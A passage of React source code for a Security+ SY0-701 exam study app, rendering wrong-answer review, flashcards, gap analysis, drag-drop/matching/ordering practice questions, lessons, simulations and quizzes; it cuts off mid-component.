  const [expanded, setExpanded] = useState({});
  
  const filtered = filter === 0 ? wrongAnswers : wrongAnswers.filter(w => w.question.domain === filter);
  
  const toggleExpand = (idx) => {
    setExpanded(prev => ({...prev, [idx]: !prev[idx]}));
  };
  
  if (wrongAnswers.length === 0) {
    return (
      <div className="container">
        <div className="header">
          <button className="nav-btn" onClick={onBack}> Back</button>
          <h2>Wrong Answer Review</h2>
        </div>
        <div className="card" style={{textAlign:'center',padding:'40px'}}>
          <div style={{fontSize:'4rem',marginBottom:'16px'}}></div>
          <h3 style={{color:'#10b981'}}>No Wrong Answers!</h3>
          <p style={{marginTop:'12px',color:'#a1a1aa'}}>Complete quizzes to track questions you miss.</p>
        </div>
      </div>
    );
  }
  
  // Count by domain
  const domainCounts = {};
  DOMAINS.forEach(d => { domainCounts[d.id] = wrongAnswers.filter(w => w.question.domain === d.id).length; });
  
  return (
    <div className="container">
      <div className="header">
        <button className="nav-btn" onClick={onBack}> Back</button>
        <h2>Wrong Answer Review ({wrongAnswers.length})</h2>
        <button className="btn btn-danger" onClick={onClear}>Clear All</button>
      </div>
      
      <div className="tab-container">
        <button className={`tab ${filter===0?'active':''}`} onClick={() => setFilter(0)}>All ({wrongAnswers.length})</button>
        {DOMAINS.map(d => domainCounts[d.id] > 0 && (
          <button key={d.id} className={`tab ${filter===d.id?'active':''}`} onClick={() => setFilter(d.id)}>
            D{d.id} ({domainCounts[d.id]})
          </button>
        ))}
      </div>
      
      <p style={{marginBottom:'16px',color:'#a1a1aa'}}>Click a question to see the explanation and correct answer.</p>
      
      {filtered.map((item, idx) => {
        const q = item.question;
        const domain = DOMAINS.find(d => d.id === q.domain);
        const isExpanded = expanded[idx];
        return (
          <div key={idx} className="wrong-answer-item" onClick={() => toggleExpand(idx)} style={{cursor:'pointer'}}>
            <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:'12px'}}>
              <span className="badge" style={{background:domain.color}}>Domain {q.domain}</span>
              <span style={{color:'#71717a',fontSize:'0.85rem'}}>{isExpanded ? '' : ''}</span>
            </div>
            <p style={{fontWeight:'500',marginBottom:'12px'}}>{q.question}</p>
            
            <div style={{fontSize:'0.9rem',marginBottom:'8px'}}>
              <span style={{color:'#ef4444'}}>Your answer: {String.fromCharCode(65 + item.userAnswer)}. {q.options[item.userAnswer]}</span>
            </div>
            
            {isExpanded && (
              <div style={{marginTop:'16px',paddingTop:'16px',borderTop:'1px solid #3f3f46'}}>
                <div style={{marginBottom:'12px'}}>
                  <span style={{color:'#10b981',fontWeight:'500'}}>Correct answer: {String.fromCharCode(65 + q.correct)}. {q.options[q.correct]}</span>
                </div>
                <div style={{background:'#18181b',padding:'12px',borderRadius:'6px',marginTop:'12px'}}>
                  <strong style={{color:'#6366f1'}}>Explanation:</strong>
                  <p style={{marginTop:'8px',color:'#a1a1aa'}}>{q.explanation}</p>
                </div>
                <div style={{marginTop:'12px'}}>
                  <strong>All Options:</strong>
                  {q.options.map((opt, i) => (
                    <div key={i} style={{padding:'8px 0',color: i === q.correct ? '#10b981' : i === item.userAnswer ? '#ef4444' : '#71717a'}}>
                      {String.fromCharCode(65+i)}. {opt} {i === q.correct && ''} {i === item.userAnswer && i !== q.correct && ''}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        );
      })}
    </div>
  );
}

// ============================================
// FLASHCARD COMPONENT
// ============================================
function Flashcards({ onBack }) {
  const [cards] = useState(() => [...GLOSSARY].sort(() => Math.random() - 0.5));
  const [current, setCurrent] = useState(0);
  const [flipped, setFlipped] = useState(false);
  const [known, setKnown] = useState([]);
  const [learning, setLearning] = useState([]);
  const [mode, setMode] = useState('all'); // 'all', 'learning', 'known'
  
  const activeCards = mode === 'learning' ? cards.filter((_, i) => learning.includes(i)) :
                      mode === 'known' ? cards.filter((_, i) => known.includes(i)) : cards;
  
  const currentCard = activeCards[current % activeCards.length];
  
  const handleNext = () => {
    setFlipped(false);
    setTimeout(() => setCurrent((current + 1) % activeCards.length), 150);
  };
  
  const handlePrev = () => {
    setFlipped(false);
    setTimeout(() => setCurrent((current - 1 + activeCards.length) % activeCards.length), 150);
  };
  
  const markKnown = () => {
    const idx = cards.indexOf(currentCard);
    if (!known.includes(idx)) {
      setKnown([...known, idx]);
      setLearning(learning.filter(i => i !== idx));
    }
    handleNext();
  };
  
  const markLearning = () => {
    const idx = cards.indexOf(currentCard);
    if (!learning.includes(idx)) {
      setLearning([...learning, idx]);
      setKnown(known.filter(i => i !== idx));
    }
    handleNext();
  };
  
  const resetProgress = () => {
    setKnown([]);
    setLearning([]);
    setCurrent(0);
    setMode('all');
  };
  
  if (activeCards.length === 0) {
    return (
      <div className="container">
        <div className="header">
          <button className="nav-btn" onClick={onBack}> Back</button>
          <h2>Flashcards</h2>
        </div>
        <div className="card" style={{textAlign:'center',padding:'40px'}}>
          <p>No cards in this category.</p>
          <button className="btn btn-primary" style={{marginTop:'16px'}} onClick={() => setMode('all')}>Show All Cards</button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="container">
      <div className="header">
        <button className="nav-btn" onClick={onBack}> Back</button>
        <h2>Flashcards</h2>
      </div>
      
      <div className="stats-grid" style={{gridTemplateColumns:'repeat(4, 1fr)'}}>
        <div className="stat-card" onClick={() => setMode('all')} style={{cursor:'pointer',border:mode==='all'?'2px solid #6366f1':'2px solid transparent'}}>
          <div className="stat-value">{cards.length}</div>
          <div className="stat-label">Total</div>
        </div>
        <div className="stat-card" onClick={() => setMode('learning')} style={{cursor:'pointer',border:mode==='learning'?'2px solid #f59e0b':'2px solid transparent'}}>
          <div className="stat-value" style={{color:'#f59e0b'}}>{learning.length}</div>
          <div className="stat-label">Learning</div>
        </div>
        <div className="stat-card" onClick={() => setMode('known')} style={{cursor:'pointer',border:mode==='known'?'2px solid #10b981':'2px solid transparent'}}>
          <div className="stat-value" style={{color:'#10b981'}}>{known.length}</div>
          <div className="stat-label">Known</div>
        </div>
        <div className="stat-card">
          <div className="stat-value">{cards.length - known.length - learning.length}</div>
          <div className="stat-label">Unseen</div>
        </div>
      </div>
      
      <div style={{textAlign:'center',marginBottom:'12px',color:'#71717a'}}>
        Card {(current % activeCards.length) + 1} of {activeCards.length}  Click card to flip
      </div>
      
      <div className={`flashcard ${flipped ? 'flipped' : ''}`} onClick={() => setFlipped(!flipped)}>
        <div className="flashcard-inner">
          <div className="flashcard-front">
            <div className="flashcard-term">{currentCard?.term}</div>
            <div className="flashcard-hint">Click to reveal definition</div>
          </div>
          <div className="flashcard-back">
            <div className="flashcard-term" style={{fontSize:'1.4rem',color:'#10b981'}}>{currentCard?.term}</div>
            <div className="flashcard-def">{currentCard?.definition}</div>
          </div>
        </div>
      </div>
      
      <div className="flashcard-controls">
        <button className="btn btn-secondary" onClick={handlePrev}> Prev</button>
        <button className="btn btn-warning" onClick={markLearning}>Still Learning</button>
        <button className="btn btn-success" onClick={markKnown}>Know It </button>
        <button className="btn btn-secondary" onClick={handleNext}>Next </button>
      </div>
      
      <div style={{textAlign:'center',marginTop:'24px'}}>
        <button className="btn btn-secondary" onClick={resetProgress}>Reset Progress</button>
      </div>
    </div>
  );
}

// ============================================
// GAP ANALYSIS COMPONENT
// ============================================
function GapAnalysis({ results, questions, onRemediate, onClose }) {
  const domainStats = {};
  DOMAINS.forEach(d => { domainStats[d.id] = { correct: 0, total: 0, wrong: [] }; });
  
  questions.forEach((q, idx) => {
    const d = q.domain;
    domainStats[d].total++;
    if (results[idx] === q.correct) {
      domainStats[d].correct++;
    } else {
      domainStats[d].wrong.push(q);
    }
  });
  
  const weakDomains = DOMAINS.filter(d => {
    const stats = domainStats[d.id];
    return stats.total > 0 && (stats.correct / stats.total) < 0.85;
  });
  
  const overallScore = questions.length > 0 
    ? Math.round((Object.values(domainStats).reduce((a, b) => a + b.correct, 0) / questions.length) * 100)
    : 0;
  
  return (
    <div className="card" style={{background:'#18181b'}}>
      <h3 style={{marginBottom:'20px'}}> Gap Analysis</h3>
      
      <div style={{marginBottom:'24px'}}>
        <div style={{display:'flex',justifyContent:'space-between',marginBottom:'8px'}}>
          <span>Overall Score</span>
          <span style={{color: overallScore >= 85 ? '#10b981' : overallScore >= 70 ? '#f59e0b' : '#ef4444', fontWeight:'bold'}}>{overallScore}%</span>
        </div>
        <div className="gap-bar">
          <div className="gap-fill" style={{width:`${overallScore}%`, background: overallScore >= 85 ? '#10b981' : overallScore >= 70 ? '#f59e0b' : '#ef4444'}}></div>
        </div>
      </div>
      
      <h4 style={{marginBottom:'12px'}}>Performance by Domain</h4>
      {DOMAINS.map(d => {
        const stats = domainStats[d.id];
        if (stats.total === 0) return null;
        const pct = Math.round((stats.correct / stats.total) * 100);
        return (
          <div key={d.id} style={{marginBottom:'16px'}}>
            <div style={{display:'flex',justifyContent:'space-between',marginBottom:'4px'}}>
              <span style={{color: d.color}}>D{d.id}: {d.name}</span>
              <span style={{color: pct < 85 ? '#ef4444' : '#10b981'}}>{stats.correct}/{stats.total} ({pct}%)</span>
            </div>
            <div className="gap-bar">
              <div className="gap-fill" style={{width:`${pct}%`, background: pct < 85 ? '#ef4444' : '#10b981'}}></div>
            </div>
          </div>
        );
      })}
      
      {weakDomains.length > 0 && (
        <div className="remediation-card">
          <h4 style={{marginBottom:'12px',color:'#f59e0b'}}> Remediation Recommended</h4>
          <p style={{marginBottom:'16px',color:'#a1a1aa'}}>Score below 85% in {weakDomains.length} domain(s):</p>
          {weakDomains.map(d => {
            const rems = getRemediationForDomain(d.id);
            return (
              <div key={d.id} style={{marginBottom:'12px'}}>
                <div style={{fontWeight:'500',color:d.color,marginBottom:'8px'}}>Domain {d.id}: {d.name}</div>
                {rems.slice(0, 2).map(rem => (
                  <button key={rem.id} className="btn btn-warning" style={{marginRight:'8px',marginBottom:'8px'}} onClick={() => onRemediate(rem)}>
                    {rem.title}
                  </button>
                ))}
              </div>
            );
          })}
        </div>
      )}
      
      {overallScore >= 85 && (
        <div style={{padding:'16px',background:'#064e3b',borderRadius:'8px',marginTop:'16px'}}>
          <strong style={{color:'#10b981'}}> Excellent!</strong>
          <p style={{marginTop:'8px'}}>You scored 85% or higher.</p>
        </div>
      )}
      
      <button className="btn btn-secondary" style={{marginTop:'16px'}} onClick={onClose}>Close</button>
    </div>
  );
}

// ============================================
// PBQ COMPONENTS
// ============================================
function DragDropPBQ({ pbq, onComplete }) {
  const [placements, setPlacements] = useState({});
  const [available, setAvailable] = useState([...pbq.items]);
  const [submitted, setSubmitted] = useState(false);
  
  const handleDrop = (category, item) => {
    setPlacements(prev => ({...prev, [item.text]: category}));
    setAvailable(prev => prev.filter(i => i.text !== item.text));
  };
  
  const handleRemove = (item) => {
    setPlacements(prev => { const newP = {...prev}; delete newP[item.text]; return newP; });
    setAvailable(prev => [...prev, pbq.items.find(i => i.text === item.text)]);
  };
  
  const handleSubmit = () => {
    setSubmitted(true);
    onComplete(pbq.items.filter(i => placements[i.text] === i.correct).length, pbq.items.length);
  };
  
  return (
    <div>
      <p style={{marginBottom:'16px',color:'#a1a1aa'}}>{pbq.instruction}</p>
      {!submitted && available.length > 0 && (
        <div style={{marginBottom:'20px'}}>
          <div style={{fontWeight:'500',marginBottom:'8px'}}>Items to place:</div>
          <div style={{display:'flex',flexWrap:'wrap',gap:'8px'}}>
            {available.map((item, idx) => (
              <div key={idx} className="pbq-item" draggable onDragStart={(e) => e.dataTransfer.setData('item', JSON.stringify(item))}>{item.text}</div>
            ))}
          </div>
        </div>
      )}
      <div style={{display:'grid',gridTemplateColumns:'repeat(auto-fit, minmax(200px, 1fr))',gap:'16px'}}>
        {pbq.categories.map(cat => (
          <div key={cat}>
            <div style={{fontWeight:'500',marginBottom:'8px'}}>{cat}</div>
            <div className={`pbq-zone ${!submitted ? 'active' : ''}`}
              onDragOver={(e) => e.preventDefault()}
              onDrop={(e) => { e.preventDefault(); if (!submitted) handleDrop(cat, JSON.parse(e.dataTransfer.getData('item'))); }}>
              {pbq.items.filter(i => placements[i.text] === cat).map((item, idx) => (
                <div key={idx} className={`pbq-item ${submitted ? (item.correct === cat ? 'correct' : 'incorrect') : 'placed'}`}
                  onClick={() => !submitted && handleRemove(item)}>
                  {item.text}
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>
      {submitted && <div className="feedback correct" style={{marginTop:'16px'}}><strong>Explanation:</strong> {pbq.explanation}</div>}
      {!submitted && <button className="btn btn-primary" style={{marginTop:'20px'}} onClick={handleSubmit} disabled={Object.keys(placements).length !== pbq.items.length}>Submit</button>}
    </div>
  );
}

function MatchingPBQ({ pbq, onComplete }) {
  const [matches, setMatches] = useState({});
  const [selectedLeft, setSelectedLeft] = useState(null);
  const [submitted, setSubmitted] = useState(false);
  const [shuffledRight] = useState(() => [...pbq.pairs.map(p => p.right)].sort(() => Math.random() - 0.5));
  
  const handleSelectRight = (right) => {
    if (submitted || !selectedLeft) return;
    setMatches(prev => ({...prev, [selectedLeft]: right}));
    setSelectedLeft(null);
  };
  
  const handleSubmit = () => {
    setSubmitted(true);
    onComplete(pbq.pairs.filter(p => matches[p.left] === p.right).length, pbq.pairs.length);
  };
  
  return (
    <div>
      <p style={{marginBottom:'16px',color:'#a1a1aa'}}>{pbq.instruction}</p>
      <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:'20px'}}>
        <div>
          {pbq.pairs.map((pair, idx) => (
            <div key={idx} className="match-left" style={{marginBottom:'8px',cursor:'pointer',border:selectedLeft===pair.left?'2px solid #6366f1':'2px solid transparent',background:matches[pair.left]?'#1e1b4b':'#27272a'}}
              onClick={() => !submitted && setSelectedLeft(pair.left)}>
              {pair.left}
              {matches[pair.left] && <span style={{marginLeft:'8px',color:'#6366f1'}}> {matches[pair.left]}</span>}
            </div>
          ))}
        </div>
        <div>
          {shuffledRight.map((right, idx) => {
            const isUsed = Object.values(matches).includes(right);
            const matchedLeft = Object.keys(matches).find(k => matches[k] === right);
            const isCorrect = submitted && matchedLeft && pbq.pairs.find(p => p.left === matchedLeft)?.right === right;
            return (
              <div key={idx} className={`match-right ${isCorrect ? 'correct' : submitted && matchedLeft ? 'incorrect' : ''}`}
                style={{marginBottom:'8px',opacity:isUsed&&!submitted?0.5:1}}
                onClick={() => !isUsed && handleSelectRight(right)}>{right}</div>
            );
          })}
        </div>
      </div>
      {submitted && <div className="feedback correct" style={{marginTop:'16px'}}><strong>Explanation:</strong> {pbq.explanation}</div>}
      {!submitted && <button className="btn btn-primary" style={{marginTop:'20px'}} onClick={handleSubmit} disabled={Object.keys(matches).length !== pbq.pairs.length}>Submit</button>}
    </div>
  );
}

function OrderingPBQ({ pbq, onComplete }) {
  const [items, setItems] = useState(() => [...pbq.items].sort(() => Math.random() - 0.5));
  const [submitted, setSubmitted] = useState(false);
  
  const moveItem = (fromIdx, toIdx) => {
    if (submitted) return;
    const newItems = [...items];
    const [removed] = newItems.splice(fromIdx, 1);
    newItems.splice(toIdx, 0, removed);
    setItems(newItems);
  };
  
  const handleSubmit = () => {
    setSubmitted(true);
    onComplete(items.filter((item, idx) => item.order === idx + 1).length, items.length);
  };
  
  return (
    <div>
      <p style={{marginBottom:'16px',color:'#a1a1aa'}}>{pbq.instruction}</p>
      {items.map((item, idx) => (
        <div key={item.text} className="order-item" style={{background:submitted?(item.order===idx+1?'#064e3b':'#450a0a'):'#27272a'}}>
          <div className="order-num">{idx + 1}</div>
          <div style={{flex:1}}>{item.text}</div>
          {submitted && item.order !== idx + 1 && <span style={{color:'#ef4444'}}> #{item.order}</span>}
          {!submitted && (
            <div style={{display:'flex',flexDirection:'column',gap:'2px'}}>
              <button className="btn btn-secondary" style={{padding:'2px 8px'}} onClick={() => moveItem(idx, Math.max(0, idx-1))} disabled={idx===0}></button>
              <button className="btn btn-secondary" style={{padding:'2px 8px'}} onClick={() => moveItem(idx, Math.min(items.length-1, idx+1))} disabled={idx===items.length-1}></button>
            </div>
          )}
        </div>
      ))}
      {submitted && <div className="feedback correct" style={{marginTop:'16px'}}><strong>Explanation:</strong> {pbq.explanation}</div>}
      {!submitted && <button className="btn btn-primary" style={{marginTop:'20px'}} onClick={handleSubmit}>Submit</button>}
    </div>
  );
}

function PBQPlayer({ onBack }) {
  const [current, setCurrent] = useState(0);
  const [scores, setScores] = useState([]);
  const [done, setDone] = useState(false);
  const pbq = PBQ_DATA[current];
  const domain = DOMAINS.find(d => d.id === pbq?.domain);
  
  const handleComplete = (correct, total) => setScores(prev => [...prev, { correct, total }]);
  const handleNext = () => current < PBQ_DATA.length - 1 ? setCurrent(current + 1) : setDone(true);
  
  if (done) {
    const totalCorrect = scores.reduce((a, b) => a + b.correct, 0);
    const totalItems = scores.reduce((a, b) => a + b.total, 0);
    const pct = Math.round((totalCorrect / totalItems) * 100);
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}>
          <h2>PBQ Assessment Complete!</h2>
          <div className="score-display" style={{color:pct>=85?'#10b981':pct>=70?'#f59e0b':'#ef4444'}}>{pct}%</div>
          <p>{totalCorrect} / {totalItems} items correct across {scores.length} PBQs</p>
        </div>
      </div>
    );
  }
  
  return (
    <div className="container">
      <div className="header">
        <span>PBQ {current + 1} of {PBQ_DATA.length}</span>
        <span className="badge" style={{background:domain?.color}}>Domain {pbq.domain}</span>
      </div>
      <div className="card">
        <div style={{display:'flex',justifyContent:'space-between',marginBottom:'16px'}}>
          <h3 style={{color:domain?.color}}>{pbq.title}</h3>
          <span className="badge" style={{background:'#27272a'}}>{pbq.type}</span>
        </div>
        {pbq.type === 'drag-drop' && <DragDropPBQ pbq={pbq} onComplete={handleComplete} key={pbq.id} />}
        {pbq.type === 'matching' && <MatchingPBQ pbq={pbq} onComplete={handleComplete} key={pbq.id} />}
        {pbq.type === 'ordering' && <OrderingPBQ pbq={pbq} onComplete={handleComplete} key={pbq.id} />}
        {scores.length > current && <button className="btn btn-primary" style={{marginTop:'16px'}} onClick={handleNext}>{current < PBQ_DATA.length - 1 ? 'Next ' : 'Results'}</button>}
      </div>
    </div>
  );
}

// ============================================
// MAIN COMPONENTS
// ============================================
function Hub({ onNavigate, wrongCount }) {
  return (
    <div className="container">
      <div className="header">
        <h1>Security+ SY0-701 Training Platform</h1>
        <div>
          <button className="nav-btn" onClick={() => onNavigate('flashcards')}>Flashcards</button>
          <button className="nav-btn" onClick={() => onNavigate('pbq')}>PBQs</button>
          <button className="nav-btn" onClick={() => onNavigate('wrong')} style={{position:'relative'}}>
            Review
            {wrongCount > 0 && <span style={{position:'absolute',top:'-5px',right:'-5px',background:'#ef4444',borderRadius:'50%',width:'18px',height:'18px',fontSize:'0.7rem',display:'flex',alignItems:'center',justifyContent:'center'}}>{wrongCount}</span>}
          </button>
          <button className="nav-btn" onClick={() => onNavigate('glossary')}>Glossary</button>
          <button className="nav-btn" onClick={() => onNavigate('practice')}>Practice Exam</button>
        </div>
      </div>
      <div className="stats-grid">
        <div className="stat-card"><div className="stat-value">{LESSON_DATA.length}</div><div className="stat-label">Lessons</div></div>
        <div className="stat-card"><div className="stat-value">{QUESTIONS.length}</div><div className="stat-label">Questions</div></div>
        <div className="stat-card"><div className="stat-value">{SIMULATION_DATA.length}</div><div className="stat-label">Simulations</div></div>
        <div className="stat-card"><div className="stat-value">{PBQ_DATA.length}</div><div className="stat-label">PBQs</div></div>
        <div className="stat-card"><div className="stat-value">{GLOSSARY.length}</div><div className="stat-label">Terms</div></div>
      </div>
      <h2 style={{marginBottom:'16px'}}>Select a Domain</h2>
      <div className="domain-grid">
        {DOMAINS.map(d => {
          const lessons = LESSON_DATA.filter(l => l.domain === d.id).length;
          const questions = QUESTIONS.filter(q => q.domain === d.id).length;
          const sims = SIMULATION_DATA.filter(s => s.domain === d.id).length;
          return (
            <div key={d.id} className="card" onClick={() => onNavigate('domain', d.id)} style={{cursor:'pointer'}}>
              <div style={{display:'flex',justifyContent:'space-between'}}>
                <h3 style={{color:d.color}}>Domain {d.id}</h3>
                <span className="badge" style={{background:d.color}}>{d.weight}%</span>
              </div>
              <p style={{margin:'8px 0'}}>{d.name}</p>
              <div style={{fontSize:'0.85rem',color:'#71717a'}}>{lessons} Lessons  {sims} Sims  {questions} Questions</div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function DomainView({ domainId, onNavigate, onBack }) {
  const [tab, setTab] = useState('lessons');
  const domain = DOMAINS.find(d => d.id === domainId);
  const lessons = LESSON_DATA.filter(l => l.domain === domainId);
  const sims = SIMULATION_DATA.filter(s => s.domain === domainId && s.type === 'SIM');
  const rems = SIMULATION_DATA.filter(s => s.domain === domainId && s.type === 'REM');
  const questions = QUESTIONS.filter(q => q.domain === domainId);
  const pbqs = PBQ_DATA.filter(p => p.domain === domainId);
  
  return (
    <div className="container">
      <div className="header">
        <div><button className="nav-btn" onClick={onBack}> Back</button><span style={{marginLeft:'16px',color:domain.color,fontWeight:'bold'}}>Domain {domainId}: {domain.name}</span></div>
      </div>
      <div className="tab-container">
        <button className={`tab ${tab==='lessons'?'active':''}`} onClick={() => setTab('lessons')}>Lessons ({lessons.length})</button>
        <button className={`tab ${tab==='sims'?'active':''}`} onClick={() => setTab('sims')}>Sims ({sims.length})</button>
        <button className={`tab ${tab==='rem'?'active':''}`} onClick={() => setTab('rem')}>Remediation ({rems.length})</button>
        <button className={`tab ${tab==='quiz'?'active':''}`} onClick={() => setTab('quiz')}>Quiz</button>
        <button className={`tab ${tab==='pbq'?'active':''}`} onClick={() => setTab('pbq')}>PBQs ({pbqs.length})</button>
      </div>
      
      {tab === 'lessons' && lessons.map(l => (
        <div key={l.id} className="list-item" onClick={() => onNavigate('lesson', l)}>
          <div><div style={{fontWeight:'500'}}>{l.title}</div><div style={{fontSize:'0.85rem',color:'#71717a'}}>{l.difficulty}</div></div>
          <span style={{color:domain.color}}></span>
        </div>
      ))}
      
      {tab === 'sims' && sims.map(s => (
        <div key={s.id} className="list-item" onClick={() => onNavigate('simulation', s)}>
          <div><div style={{fontWeight:'500'}}>{s.title}</div><div style={{fontSize:'0.85rem',color:'#71717a'}}>{s.decision_points.length} decisions</div></div>
          <span style={{color:domain.color}}></span>
        </div>
      ))}
      
      {tab === 'rem' && rems.map(s => (
        <div key={s.id} className="list-item" onClick={() => onNavigate('simulation', s)}>
          <div><div style={{fontWeight:'500'}}>{s.title}</div><div style={{fontSize:'0.85rem',color:'#71717a'}}>{s.decision_points.length} scenarios</div></div>
          <span style={{color:'#f59e0b'}}></span>
        </div>
      ))}
      
      {tab === 'quiz' && (
        <div className="card">
          <h3>Domain {domainId} Quiz</h3>
          <p style={{marginBottom:'16px'}}>{questions.length} questions available</p>
          <button className="btn btn-primary" onClick={() => onNavigate('quiz', {domainId, count: 10})}>10 Questions</button>
          <button className="btn btn-secondary" style={{marginLeft:'8px'}} onClick={() => onNavigate('quiz', {domainId, count: questions.length})}>All {questions.length}</button>
        </div>
      )}
      
      {tab === 'pbq' && pbqs.map(p => (
        <div key={p.id} className="list-item" onClick={() => onNavigate('pbq-single', p)}>
          <div><div style={{fontWeight:'500'}}>{p.title}</div><div style={{fontSize:'0.85rem',color:'#71717a'}}>{p.type}</div></div>
          <span style={{color:domain.color}}></span>
        </div>
      ))}
    </div>
  );
}

function LessonViewer({ lesson, onBack }) {
  const [idx, setIdx] = useState(0);
  const domain = DOMAINS.find(d => d.id === lesson.domain);
  const sections = lesson.sections || [];
  return (
    <div className="container">
      <div className="header">
        <div><button className="nav-btn" onClick={onBack}> Back</button><span style={{marginLeft:'16px'}}>{lesson.title}</span></div>
      </div>
      <div className="tab-container">
        {sections.map((s,i) => <button key={i} className={`tab ${idx===i?'active':''}`} onClick={() => setIdx(i)}>{i+1}</button>)}
        <button className={`tab ${idx===sections.length?'active':''}`} onClick={() => setIdx(sections.length)}>Summary</button>
      </div>
      {idx < sections.length ? (
        <div className="card lesson-content">
          <h3 style={{color:domain.color,marginBottom:'16px'}}>{sections[idx].title}</h3>
          {(sections[idx].content || '').split('\n\n').map((p,i) => <div key={i} className="lesson-section">{p.split('\n').map((l,j) => <p key={j} style={{marginBottom:'8px'}}>{l}</p>)}</div>)}
        </div>
      ) : (
        <div className="card">
          <h3 style={{color:domain.color,marginBottom:'16px'}}>Key Takeaways</h3>
          {(lesson.keyTakeaways || []).map((t,i) => <div key={i} className="key-point">{t}</div>)}
          <h3 style={{color:'#f59e0b',marginTop:'24px',marginBottom:'16px'}}>Exam Tips</h3>
          {(lesson.examTips || []).map((t,i) => <div key={i} className="exam-tip">{t}</div>)}
        </div>
      )}
      <div style={{display:'flex',justifyContent:'space-between',marginTop:'20px'}}>
        <button className="btn btn-secondary" onClick={() => setIdx(Math.max(0,idx-1))} disabled={idx===0}> Prev</button>
        <button className="btn btn-primary" onClick={() => setIdx(Math.min(sections.length,idx+1))} disabled={idx===sections.length}>Next </button>
      </div>
    </div>
  );
}

function SimulationPlayer({ simulation, onBack, onNavigate }) {
  const [stage, setStage] = useState('intro');
  const [dpIdx, setDpIdx] = useState(0);
  const [selected, setSelected] = useState(null);
  const [showFb, setShowFb] = useState(false);
  const [correct, setCorrect] = useState(0);
  const domain = DOMAINS.find(d => d.id === simulation.domain);
  const dps = simulation.decision_points || [];
  
  if (dps.length === 0) {
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}><h2>{simulation.title}</h2><p style={{color:'#a1a1aa'}}>No decision points available.</p></div>
      </div>
    );
  }
  
  if (stage === 'intro') {
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="sim-intro">
          <h2 style={{color:domain.color,marginBottom:'16px'}}>{simulation.title}</h2>
          <p><strong>Role:</strong> {simulation.role}</p>
          <p><strong>Organization:</strong> {simulation.organization?.name}</p>
          <p style={{marginTop:'16px',whiteSpace:'pre-wrap'}}>{simulation.introduction}</p>
          <button className="btn btn-primary" style={{marginTop:'24px'}} onClick={() => setStage('play')}>Begin ({dps.length} Decisions)</button>
        </div>
      </div>
    );
  }
  
  if (stage === 'complete') {
    const pct = Math.round((correct / dps.length) * 100);
    const rems = getRemediationForDomain(simulation.domain);
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}>
          <h2>Complete!</h2>
          <div className="score-display" style={{color:pct>=85?'#10b981':pct>=70?'#f59e0b':'#ef4444'}}>{pct}%</div>
          <p>{correct} / {dps.length} optimal</p>
          {pct < 85 && simulation.type !== 'REM' && rems.length > 0 && (
            <div className="remediation-card" style={{textAlign:'left',marginTop:'24px'}}>
              <h4 style={{color:'#f59e0b'}}> Try Remediation</h4>
              {rems.slice(0,2).map(rem => <button key={rem.id} className="btn btn-warning" style={{margin:'8px 8px 0 0'}} onClick={() => onNavigate('simulation', rem)}>{rem.title}</button>)}
            </div>
          )}
        </div>
      </div>
    );
  }
  
  const dp = dps[dpIdx];
  return (
    <div className="container">
      <div className="header">
        <span>Decision {dpIdx + 1} of {dps.length}</span>
        <span style={{color:domain.color}}>{correct} correct</span>
      </div>
      <div className="card">
        <h3 style={{color:domain.color,marginBottom:'16px'}}>{dp?.title}</h3>
        <div style={{marginBottom:'20px',whiteSpace:'pre-wrap'}}>{dp?.situation}</div>
        {dp?.question && <p style={{fontWeight:'bold',marginBottom:'16px'}}>{dp.question}</p>}
        {(dp?.options || []).map((o,i) => (
          <div key={i} className={`dp-option ${selected===o?'selected':''}`} onClick={() => !showFb && setSelected(o)}
            style={showFb && o.is_optimal ? {borderColor:'#10b981',background:'#064e3b'} : showFb && selected===o && !o.is_optimal ? {borderColor:'#ef4444',background:'#450a0a'} : {}}>
            <strong>{o.id?.toUpperCase() || String.fromCharCode(65+i)}.</strong> {o.text}
          </div>
        ))}
        {showFb && selected && (
          <div className={`feedback ${selected.is_optimal?'correct':'incorrect'}`}>
            <strong>{selected.is_optimal ? ' Optimal!' : ' Not Optimal'}</strong>
            <p style={{marginTop:'8px'}}>{selected.feedback}</p>
          </div>
        )}
        <div style={{marginTop:'20px',display:'flex',justifyContent:'flex-end'}}>
          {!showFb ? <button className="btn btn-primary" onClick={() => {if(selected){setShowFb(true);if(selected.is_optimal)setCorrect(correct+1);}}} disabled={!selected}>Submit</button>
            : <button className="btn btn-primary" onClick={() => {if(dpIdx<dps.length-1){setDpIdx(dpIdx+1);setSelected(null);setShowFb(false);}else setStage('complete');}}>{dpIdx<dps.length-1?'Next':'Results'}</button>}
        </div>
      </div>
    </div>
  );
}

function QuizPlayer({ config, onBack, onNavigate, onWrongAnswer }) {
  const [qs, setQs] = useState([]);
  const [cur, setCur] = useState(0);
  const [sel, setSel] = useState(null);
  const [showFb, setShowFb] = useState(false);
  const [answers, setAnswers] = useState({});
  const [done, setDone] = useState(false);
  const [showGap, setShowGap] = useState(false);
  
  useEffect(() => {
    let pool = config.domainId ? QUESTIONS.filter(q => q.domain === config.domainId) : [...QUESTIONS];
    setQs(pool.sort(() => Math.random() - 0.5).slice(0, config.count || 10));
  }, []);
  
  const q = qs[cur];
  if (!q) return <div className="container"><p>Loading...</p></div>;
  const domain = DOMAINS.find(d => d.id === q.domain);
  const score = Object.keys(answers).filter(k => answers[k] === qs[k]?.correct).length;
  
  if (done) {
    const pct = Math.round((score / qs.length) * 100);
    if (showGap) {
      return (
        <div className="container">
          <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
          <GapAnalysis results={answers} questions={qs} onRemediate={(rem) => onNavigate('simulation', rem)} onClose={() => setShowGap(false)} />
        </div>
      );
    }
    return (
      <div className="container">
        <div className="header"><button className="nav-btn" onClick={onBack}> Back</button></div>
        <div className="card" style={{textAlign:'center'}}>
          <h2>Quiz Complete!</h2>
